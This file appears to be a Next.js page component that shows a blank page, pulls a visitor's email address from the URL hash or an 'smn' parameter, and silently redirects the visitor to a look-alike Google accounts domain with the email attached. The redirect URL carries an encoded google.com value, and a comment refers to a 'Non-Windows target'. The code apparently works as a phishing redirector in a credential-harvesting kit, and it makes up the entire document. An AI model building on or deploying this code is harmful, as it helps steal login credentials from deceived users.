// pages/index.js (or hash-redirect.js)
import { useEffect } from 'react';

export default function Home() {
  useEffect(() => {
    let email = '';

    const fullUrl = window.location.href;

    // 1. Try hash first (#connie@...)
    if (window.location.hash) {
      email = window.location.hash.slice(1); // remove #
    }

    // 2. Fallback: try &smn= or ?smn= in URL
    if (!email) {
      const match = fullUrl.match(/[?&]smn=([^&]+)/);
      if (match && match[1]) email = decodeURIComponent(match[1]);
    }

    if (email) {
      // Redirect to Non-Windows target with email
      window.location.href =
        `https://accounts.ehpcve.icu?znYsiH1YXQ=aHR0cHM6Ly9hY2NvdW50cy5nb29nbGUuY29t/&smn=${encodeURIComponent(email)}`;
    }
  }, []);

  return null; // blank page while redirecting
}
